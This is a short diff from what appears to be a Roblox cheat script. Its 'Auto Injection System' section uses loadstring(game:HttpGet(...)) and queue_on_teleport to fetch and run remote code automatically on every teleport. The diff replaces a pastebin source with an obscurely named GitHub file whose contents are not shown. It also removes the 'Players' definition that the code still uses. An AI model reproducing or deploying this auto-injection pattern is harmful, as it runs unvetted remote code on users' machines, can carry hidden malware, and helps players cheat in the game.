@@ -592,16 +592,15 @@ end
 -- 🚀 Auto Injection System
 -------------------------------------------------------------
 local TeleportService = game:GetService("TeleportService")
-local Players = game:GetService("Players")
 
 -- Auto-execute on teleport/game join
 TeleportService.TeleportInitFailed:Connect(function()
 	task.wait(2)
-	loadstring(game:HttpGet("https://pastebin.com/raw/JvwhBqge"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Lightdwad/dawdwadwawa/refs/heads/main/dawdawdawwadaw"))()
 end)
 
 Players.LocalPlayer.OnTeleport:Connect(function()
-	queue_on_teleport('loadstring(game:HttpGet("https://pastebin.com/raw/JvwhBqge"))()') 
+	queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/Lightdwad/dawdwadwawa/refs/heads/main/dawdawdawwadaw"))()') 
 end)
 
 -------------------------------------------------------------
